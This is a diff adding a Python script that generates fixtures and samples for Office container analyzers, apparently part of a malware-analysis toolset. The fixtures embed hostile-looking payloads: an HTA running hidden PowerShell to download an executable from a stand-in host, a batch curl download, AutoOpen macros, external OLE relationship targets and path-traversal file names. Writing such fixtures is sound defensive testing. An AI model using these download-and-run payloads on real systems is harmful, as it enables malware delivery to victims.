@@ -1,0 +1,453 @@
+#!/usr/bin/env python3
+"""Makes the files PLAN.md 7.5 batch 5's Office container modules are compared on: OneNote, ActiveMime,
+hidden MIME, Word 2003 XML packages, relationship parts, document XML, and compound files for
+officeparser3 and extracted_ole_analyzer. No Office was involved: each is written here byte by byte,
+with the compound file writer of tools/samples/make-oletools. It needs only Python, and writes the same
+bytes each time.
+
+    tools/samples/make-office-containers    writes tools/ace3/dumps/fixtures/office, the dumps' files,
+                                             and a few samples under samples/ace4/office, in the manifest
+"""
+
+import base64
+import gzip
+import hashlib
+import importlib.machinery
+import importlib.util
+import io
+import json
+import struct
+import zipfile
+import zlib
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent.parent
+SAMPLES = ROOT / "samples"
+OFFICE = SAMPLES / "ace4" / "office"
+FIXTURES = ROOT / "tools" / "ace3" / "dumps" / "fixtures" / "office"
+SOURCE_DOCM = SAMPLES / "ace3" / "office" / "mortgage_payment-0873821-0565.docm"
+SOURCE = "tools/samples/make-office-containers"
+
+_loader = importlib.machinery.SourceFileLoader("make_oletools", str(ROOT / "tools" / "samples" / "make-oletools"))
+_spec = importlib.util.spec_from_loader("make_oletools", _loader)
+oletools = importlib.util.module_from_spec(_spec)
+_loader.exec_module(oletools)
+Cfb, compress_literal, dir_stream, office_zip = oletools.Cfb, oletools.compress_literal, oletools.dir_stream, oletools.office_zip
+
+# --- OneNote -----------------------------------------------------------------------------------
+
+ONE_HEADER = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3")
+FDSO_GUID = bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac")
+HTA = b'<html><script language="VBScript">CreateObject("WScript.Shell").Run "powershell -w hidden iwr http://onenote.example.com/p.exe"</script></html>\n'
+BAT = b"@echo off\r\ncurl -o %TEMP%\\a.exe http://onenote.example.net/a.exe\r\n"
+
+
+def fdso(payload, length=None, filler=b"\0" * 12):
+    """A FileDataStoreObject: its GUID, cbLength, 12 unused bytes and the data."""
+    return FDSO_GUID + struct.pack("<Q", len(payload) if length is None else length) + filler + payload
+
+
+def onenote(*objects, header=ONE_HEADER):
+    body = header + bytes(1024 - len(header))
+    for obj in objects:
+        body += obj + b"\0" * 8
+    return body
+
+
+def onenote_fixtures():
+    return {
+        "two_files.one": onenote(fdso(HTA), fdso(BAT)),
+        "by_header.bin": onenote(fdso(HTA)),
+        "no_objects.one": onenote(header=b"not a header"),
+        "plain.txt": b"neither a .one name nor the header " + FDSO_GUID + b"\n",
+        "truncated.one": onenote(fdso(BAT), fdso(b"short", length=1000)),
+        "duplicate.one": onenote(fdso(HTA), fdso(HTA)),
+        "empty_payload.one": onenote(fdso(b""), fdso(BAT)),
+        # the GUID inside a payload is found again, since the search goes on after the GUID
+        "nested.one": onenote(fdso(b"outer " + fdso(b"inner payload\n") + b" end\n")),
+        "short_header.one": FDSO_GUID + b"\x05",
+        "empty.one": b"",
+    }
+
+
+# --- ActiveMime --------------------------------------------------------------------------------
+
+
+def activemime(payload, field_size=4, field_d=4, field_e=4, tail=b"", compressed=None, head=b"ActiveMime\0\0", field=None):
+    """ace3's parse_active_mime layout: 12 bytes, 2, a sized field, 4, the compressed size and the
+    sizes of two fields, the first, the vba tail type, the size, then zlib."""
+    body = zlib.compress(payload) if compressed is None else compressed
+    out = head + b"\x01\xf0" + struct.pack("<I", field_size) + (b"\xff" * field_size if field is None else field)
+    out += b"\x01\x00\x00\xf0" + struct.pack("<III", len(body), field_d, field_e) + bytes(field_d)
+    out += struct.pack("<I", 1) + struct.pack("<I", len(payload)) + body + tail
+    return out
+
+
+def activemime_fixtures(ole):
+    good = activemime(ole)
+    return {
+        "ole.mso": good,
+        "text.mso": activemime(b"Sub AutoOpen()\r\n  Shell \"calc\"\r\nEnd Sub\r\n", field_size=8, field_d=8),
+        "empty_payload.mso": activemime(b""),
+        "trailing.mso": activemime(b"payload with bytes after the stream", tail=b"trailing junk"),
+        "bad_zlib.mso": activemime(b"", compressed=b"\x78\x9cnot zlib at all"),
+        "truncated_zlib.mso": activemime(b"x" * 1000, compressed=zlib.compress(b"x" * 1000)[:6]),
+        "field_e.mso": activemime(b"payload", field_e=8),
+        "big_field.mso": activemime(b"payload", field_size=0x7FFFFFFF, field=b""),
+        "header_only.mso": b"ActiveMime\0\0\x01\xf0",
+        "short.mso": b"ActiveMime",
+        "not_activemime.mso": b"activemime" + good[10:],
+        "late.bin": b"x" + good,
+    }
+
+
+# --- hidden MIME -------------------------------------------------------------------------------
+
+B64_DOC = base64.encodebytes(b"MZ\x90\x00 an attachment hidden in MIME\n" * 3).decode()
+
+
+def nested_mime(n):
+    """Multiparts nested n deep around one text part."""
+    out = 'junk\nContent-Type: multipart/mixed; boundary="b0"\n\n'
+    for i in range(n):
+        out += f'--b{i}\nContent-Type: multipart/mixed; boundary="b{i + 1}"\n\n'
+    out += f"--b{n}\nContent-Type: text/plain\n\ndeep part\n"
+    for i in range(n, -1, -1):
+        out += f"--b{i}--\n"
+    return out.encode()
+
+
+def hidden_mime_fixtures(mht_vba):
+    hidden = (
+        b"\x89BIN\x00\x01 junk before the MIME part\r\n"
+        b"MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"==b1\"\r\n\r\n"
+        b"--==b1\r\nContent-Type: text/plain\r\n\r\nhello from inside\r\n"
+        b"--==b1\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\n\r\n"
+        + B64_DOC.encode()
+        + b"\r\n--==b1--\r\n\x00\x00 junk after\r\n"
+    )
+    return {
+        "hidden.bin": hidden,
+        "unquoted.txt": (
+            b"preamble text\ncOnTeNt-TyPe :  multipart/related;   boundary=abc123\n\n"
+            b"--abc123\nContent-Type: text/html\nContent-Transfer-Encoding: quoted-printable\n\n<p>a=3Db</p>\n"
+            b"--abc123\nContent-Type: text/plain\n\nno end boundary follows\n"
+        ),
+        "regex.txt": (
+            b"Content-Type: multipart/mixed; boundary=\"a+b(c)\"\n\n--a+b(c)\nContent-Type: text/plain\n\none\n--a+b(c)--\n"
+        ),
+        "single.txt": b"x\nContent-Type: text/plain; boundary=x\n\nthe whole body is one part\n",
+        "empty_parts.txt": b"Content-Type: multipart/mixed; boundary=e\n\n--e\n\n--e\nContent-Type: text/plain\n\n--e--\n",
+        "nested.txt": (
+            b"Content-Type: multipart/mixed; boundary=outer\n\n--outer\nContent-Type: multipart/alternative; boundary=inner\n\n"
+            b"--inner\nContent-Type: text/plain\n\ninner one\n--inner\nContent-Type: text/html\n\n<b>inner two</b>\n--inner--\n"
+            b"--outer\nContent-Type: text/plain\nContent-Transfer-Encoding: x-uuencode\n\nbegin 644 a.txt\n#86)C\n`\nend\n"
+            b"--outer--\n"
+        ),
+        "boundary_only.txt": b"content-type: text/plain boundary=\n",
+        "no_mime.txt": b"just text, no content type here\n",
+        "email.rfc822": b"From: a@example.com\nContent-Type: multipart/mixed; boundary=z\n\n--z\n\ninside\n--z--\n",
+        "message.eml": (
+            b"From: a@example.com\nTo: b@example.com\nSubject: s\nMessage-ID: <1@example.com>\n"
+            b"Content-Type: multipart/mixed; boundary=z\n\n--z\nContent-Type: text/plain\n\ninside an email\n--z--\n"
+        ),
+        "capture.pcap": struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1) + b"Content-Type: multipart/mixed; boundary=p\n\n--p\n\nin a capture\n--p--\n",
+        "vba_mht.mht": mht_vba,
+        "nested_971.txt": nested_mime(971),
+        "nested_972.txt": nested_mime(972),
+    }
+
+
+# --- Word 2003 XML packages --------------------------------------------------------------------
+
+PKG = "http://schemas.microsoft.com/office/2006/xmlPackage"
+
+
+def flat(parts, progid="Word.Document", head=""):
+    out = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + head
+    out += f'<?mso-application progid="{progid}"?>\n<pkg:package xmlns:pkg="{PKG}">\n'
+    for name, kind, body in parts:
+        name_attr = "" if name is None else f' pkg:name="{name}"'
+        if kind == "binary":
+            out += f'<pkg:part{name_attr} pkg:contentType="application/octet-stream"><pkg:binaryData>{body}</pkg:binaryData></pkg:part>\n'
+        else:
+            out += f'<pkg:part{name_attr} pkg:contentType="application/xml"><pkg:xmlData>{body}</pkg:xmlData></pkg:part>\n'
+    return out + "</pkg:package>\n"
+
+
+def b64(data, width=76):
+    text = base64.b64encode(data).decode()
+    return "\n".join(text[i:i + width] for i in range(0, len(text), width))
+
+
+def xml_binary_fixtures(vba):
+    png = b"\x89PNG\r\n\x1a\n" + b"\0" * 32
+    return {
+        "flat.xml": flat([
+            ("/word/document.xml", "xml", "<w:document xmlns:w='urn:w'><w:body>text</w:body></w:document>"),
+            ("/word/vbaProject.bin", "binary", b64(vba)),
+            ("/word/media/image1.png", "binary", b64(png)),
+        ]),
+        "names.xml": flat([
+            ("/", "binary", b64(b"slash")),
+            ("../../etc/escape.txt", "binary", b64(b"dots")),
+            ("a\\b.txt", "binary", b64(b"backslash")),
+            ("/same.bin", "binary", b64(b"first")),
+            ("/same.bin", "binary", b64(b"second")),
+            (None, "binary", b64(b"no name")),
+            ("/empty.bin", "binary", ""),
+        ]),
+        "bad_base64.xml": flat([
+            ("/one.bin", "binary", "QUJD!!RA==x"),
+            ("/two.bin", "binary", "QUJDRA"),
+            ("/three.bin", "binary", b64(b"three")),
+        ]),
+        "broken.xml": flat([("/ok.bin", "binary", b64(b"ok")), ("/after.bin", "binary", b64(b"after"))]).replace(
+            "</pkg:package>", "<unclosed></pkg:package>"
+        ),
+        "not_word.xml": flat([("/x.bin", "binary", b64(b"x"))], progid="Excel.Sheet"),
+        "late.xml": flat([("/x.bin", "binary", b64(b"late"))], head="<!--" + "padding " * 140 + "-->\n"),
+        "entities.xml": flat([("/e.bin", "binary", "QU&#74;D&#x52;A==")]),
+        "no_xml_decl.txt": "Word.Document " + flat([("/x.bin", "binary", b64(b"x"))]).split("\n", 1)[1],
+    }
+
+
+# --- document XML for xml_plain_text_analyzer ----------------------------------------------------
+
+W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+
+
+def document_xml(body):
+    return f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:document xmlns:w="{W}"><w:body>{body}</w:body></w:document>'
+
+
+def plain_text_fixtures():
+    return {
+        "document.xml": document_xml(
+            '<w:p><w:r><w:t>Hello </w:t></w:r><w:r><w:t xml:space="preserve">world &amp; more</w:t></w:r></w:p>'
+            '<w:p><w:fldSimple w:instr=" HYPERLINK &quot;http://plain.example.com/a&quot; "><w:r><w:t>link</w:t></w:r></w:fldSimple></w:p>'
+            '<w:p><w:r><w:instrText> INCLUDETEXT "http://plain.example.com/b" </w:instrText></w:r></w:p>'
+            '<w:p><w:r><w:t><![CDATA[cdata <text>]]></w:t></w:r></w:p>'
+        ),
+        "instr_namespace.xml": '<?xml version="1.0"?><r xmlns:i="urn:instructions"><a i:x="in a namespace" plain="no" instrument="yes">t</a>tail</r>',
+        "no_text.xml": '<?xml version="1.0"?><r><a/><b x="1"/></r>',
+        "broken.xml": '<?xml version="1.0"?><r><a>kept</a><b>lost</c></r>',
+        "big.xml": '<?xml version="1.0"?><r>' + "x" * 131072 + "</r>",
+        "not_xml.txt": "plain text, no declaration",
+        "already.noxml": '<?xml version="1.0"?><r>skip</r>',
+        "unicode.xml": '<?xml version="1.0" encoding="UTF-8"?><r>caf\u00e9 \u2603 \U0001f600</r>',
+        "cp1252.xml": '<?xml version="1.0" encoding="windows-1252"?><r>\u201cquoted\u201d</r>'.encode("cp1252"),
+        "latin1.xml": '<?xml version="1.0" encoding="ISO-8859-1"?><r>caf\u00e9</r>'.encode("latin-1"),
+        "utf16.xml": '<?xml version="1.0" encoding="UTF-16"?><r>wide \u00e9</r>'.encode("utf-16"),
+    }
+
+
+# --- relationship parts ------------------------------------------------------------------------
+
+REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
+OLE_TYPE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
+
+
+def rels(*relationships, tail=""):
+    out = f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="{REL_NS}">'
+    for attrs in relationships:
+        out += "<Relationship " + " ".join(f'{k}="{v}"' for k, v in attrs.items()) + "/>"
+    return out + tail + "</Relationships>"
+
+
+def rel(rid, target, kind=OLE_TYPE, mode="External"):
+    attrs = {"Id": rid, "Type": kind, "Target": target}
+    if mode is not None:
+        attrs["TargetMode"] = mode
+    return attrs
+
+
+def rels_fixtures():
+    external = rels(
+        rel("rId1", "http://xml-rel.example.com/payload.doc"),
+        rel("rId2", "https:.."),
+        rel("rId3", "embeddings/oleObject1.bin", mode="Internal"),
+        rel("rId4", "http://xml-rel.example.com/image.png", kind="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"),
+        rel("rId5", "mhtml:http://xml-rel.example.com/x.mht!x", mode=None),
+        rel("rId6", "file:///C:/Users/Public/evil.hta"),
+    )
+    return {
+        "external/document.xml.rels": external,
+        "broken/document.xml.rels": rels(rel("rId1", "http://xml-rel.example.com/first"), tail="<oops>"),
+        "none/document.xml.rels": rels(rel("rId1", "styles.xml", kind="urn:styles", mode=None)),
+        "gzip/document.xml.rels": gzip.compress(external.encode(), mtime=0),
+        "renamed/other.xml.rels": external,
+        "prefixed/document.xml.rels": f'<?xml version="1.0"?><r:Relationships xmlns:r="{REL_NS}"><r:Relationship Type="{OLE_TYPE}" TargetMode="External" Target="http://xml-rel.example.com/prefixed"/></r:Relationships>',
+    }
+
+
+# --- compound files for officeparser3 ----------------------------------------------------------
+
+
+def ole10native(filename, data, src=b"C:\\src\\x", temp=b"C:\\tmp\\x"):
+    """An \\x01Ole10Native stream as Packager writes it."""
+    body = struct.pack("<H", 2) + filename + b"\0" + src + b"\0" + bytes(8) + temp + b"\0" + struct.pack("<I", len(data)) + data
+    return struct.pack("<I", len(body)) + body
+
+
+def vba_project(modules, project_lines=None):
+    """A VBA project of (name, source) modules, each a standard module."""
+    lines = project_lines if project_lines is not None else [f"Module={name}" for name, _ in modules]
+    vba = {
+        "_VBA_PROJECT": struct.pack("<HHBH", 0x61CC, 0xFFFF, 0, 0),
+        "dir": compress_literal(dir_stream([(name, name, 0) for name, _ in modules])),
+    }
+    stream_names = {}
+    for name, source in modules:
+        stream_names[name] = compress_literal(source)
+    vba.update(stream_names)
+    return {
+        "PROJECT": b'ID="{00000000-0000-0000-0000-000000000000}"\r\n' + b"".join(l.encode("latin1") + b"\r\n" for l in lines) + b'Name="VBAProject"\r\n',
+        "PROJECTwm": b"",
+        "VBA": vba,
+    }
+
+
+MACRO = b'Attribute VB_Name = "Module1"\r\nSub AutoOpen()\r\n  Shell "cmd /c echo officeparser"\r\nEnd Sub\r\n'
+EMPTY_MACRO = b'Attribute VB_Name = "Empty"\r\n\r\nAttribute VB_Exposed = False\r\n'
+VBS = b'CreateObject("WScript.Shell").Run "calc.exe"\r\n'
+
+
+def native_storage(filename, data):
+    return {"\x01Ole10Native": ole10native(filename, data), "\x01CompObj": b"\x01\x00\xfe\xff" + bytes(24)}
+
+
+def ole_fixtures(real_vba):
+    files = {}
+    add = files.__setitem__
+    add("native.doc", Cfb({
+        "WordDocument": b"\xec\xa5" + bytes(510),
+        "ObjectPool": {"_1": native_storage(b"payload.vbs", VBS)},
+        "Macros": vba_project([("Module1", MACRO), ("Empty", EMPTY_MACRO)]),
+    }).build() + b"trailing bytes past the FAT")
+    add("native_names.doc", Cfb({
+        "ObjectPool": {
+            "_1": native_storage(b"../up.txt", b"up"),
+            "_2": native_storage(b"stream_1_0.dat", b"named like a stream"),
+            "_3": native_storage(b"caf\xe9\xa0", b"latin-1 and a no-break space"),
+            "_4": native_storage(b"dup.txt", b"first"),
+            "_5": native_storage(b"dup.txt", b"second"),
+            "_6": native_storage(b"Module1.bas", b"named like a macro"),
+            "_7": native_storage(b"line\nbreak.txt", b"a name with a newline"),
+        },
+        "Macros": vba_project([("Module1", MACRO)]),
+    }).build())
+    add("native_missing_dir.doc", Cfb({
+        "ObjectPool": {"_1": native_storage(b"no/such/dir.txt", b"x"), "_2": native_storage(b"after.txt", b"y")},
+    }).build())
+    add("native_empty_name.doc", Cfb({"ObjectPool": {"_1": native_storage(b"", b"nameless")}}).build())
+    add("native_long_name.doc", Cfb({"ObjectPool": {"_1": native_storage(b"n" * 300, b"long")}}).build())
+    add("native_manifest.doc", Cfb({"ObjectPool": {"_1": native_storage(b"manifest", b"overwrites the manifest\n")}}).build())
+    add("native_short.doc", Cfb({"ObjectPool": {"_1": {"\x01Ole10Native": b"\x05\x00"}}}).build())
+    # a module the PROJECT stream doesn't list: KeyError after the streams were written
+    add("missing_module.doc", Cfb({"Macros": vba_project([("Module1", MACRO)], project_lines=["Module=Other"])}).build())
+    add("two_modules.doc", Cfb({"Macros": vba_project([("Module1", MACRO), ("Module1", MACRO + b"' second\r\n")])}).build())
+    add("vba_project.bin", real_vba)
+    add("plain.msi", Cfb({"x": b"an MSI by its name"}).build())
+    add("big_stream.doc", Cfb({"big": b"B" * 10000, "small": b"s" * 100}).build())
+    add("not_ole.doc", b"\xd0\xcf\x11\xe0" + bytes(600))
+    small = Cfb({"s": b"small stream"}).build()
+    add("unknown_sectors.doc", small + bytes(512 + 128 * 512 - len(small)) + b"bytes past what the FAT covers")
+
+    def stream_cycle(cfb):
+        big = next(e for e in cfb.entries if e["name"] == "big")
+        cfb.fat[big["start"] + 1] = big["start"]
+
+    add("stream_cycle.doc", Cfb({"big": b"C" * 5000}).build(stream_cycle))
+    return files
+
+
+# --- files extracted_ole_analyzer checks ---------------------------------------------------------
+
+
+def extracted_ole_fixtures():
+    lnk = bytes.fromhex("4c0000000114020000000000c000000000000046") + bytes(56)
+    return {
+        "payload.vbs": VBS,
+        "PAYLOAD.EXE": b"MZ\x90\x00not really",
+        "shortcut.dat": lnk,
+        "script.dat": b"var x = function () { return 1; };\nx();\n",
+        "plain.txt": b"just some words\n",
+        "stream_1_0.dat": b"\x00\x01\x02 binary",
+    }
+
+
+# --- samples -----------------------------------------------------------------------------------
+
+
+def samples(real_vba, ole_native):
+    flat_doc = flat([
+        ("/word/document.xml", "xml", f"<w:document xmlns:w='{W}'><w:body><w:p><w:r><w:t>2003</w:t></w:r></w:p></w:body></w:document>"),
+        ("/word/vbaProject.bin", "binary", b64(real_vba)),
+    ]).encode()
+    docx = office_zip([
+        ("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
+        ("_rels/.rels", f'<?xml version="1.0"?><Relationships xmlns="{REL_NS}"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'),
+        ("word/document.xml", document_xml('<w:p><w:fldSimple w:instr=" HYPERLINK &quot;http://external-ole.example.com/landing&quot; "><w:r><w:t>Open the invoice</w:t></w:r></w:fldSimple></w:p>')),
+        ("word/_rels/document.xml.rels", rels(rel("rId9", "http://external-ole.example.com/template.doc"))),
+    ])
+    hidden = hidden_mime_fixtures(b"")["hidden.bin"]
+    one = onenote(fdso(HTA), fdso(BAT))
+    mso = activemime(ole_native)
+    return {
+        "invoice.one": one,
+        "oledata.mso": mso,
+        "word2003.xml": flat_doc,
+        "external_ole.docx": docx,
+        "package_object.doc": ole_native,
+        "hidden_mime.bin": hidden,
+    }
+
+
+def write(folder, files):
+    for name, data in files.items():
+        path = folder / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_bytes(data.encode() if isinstance(data, str) else data)
+
+
+def main():
+    with zipfile.ZipFile(SOURCE_DOCM) as archive:
+        real_vba = archive.read("word/vbaProject.bin")
+    ole = ole_fixtures(real_vba)
+    mht = (SAMPLES / "ace4" / "office" / "vba_mht.mht").read_bytes()
+    write(FIXTURES / "onenote", onenote_fixtures())
+    write(FIXTURES / "activemime", activemime_fixtures(ole["native.doc"]))
+    write(FIXTURES / "mime", hidden_mime_fixtures(mht))
+    write(FIXTURES / "flat", xml_binary_fixtures(real_vba))
+    write(FIXTURES / "plain", plain_text_fixtures())
+    write(FIXTURES / "rels", rels_fixtures())
+    write(FIXTURES / "ole", ole)
+    write(FIXTURES / "extracted", extracted_ole_fixtures())
+    (FIXTURES / "source.docx").write_bytes(office_zip([("word/document.xml", document_xml("<w:p/>"))]))
+
+    made = []
+    for name, data in samples(real_vba, ole["native.doc"]).items():
+        (OFFICE / name).write_bytes(data)
+        made.append(
+            {
+                "path": f"ace4/office/{name}",
+                "sha256": hashlib.sha256(data).hexdigest(),
+                "size": len(data),
+                "kinds": ["office/containers"],
+                "source": SOURCE,
+                "in_git": True,
+                "alert_path": name,
+                "meta_tags": ["type=email.attachment"],
+            }
+        )
+    manifest_path = SAMPLES / "manifest.json"
+    manifest = json.loads(manifest_path.read_text())
+    kept = [s for s in manifest["samples"] if s.get("source") != SOURCE]
+    manifest["samples"] = sorted(kept + made, key=lambda s: s["path"])
+    manifest_path.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n")
+    print(f"{len(made)} samples")
+
+
+if __name__ == "__main__":
+    main()
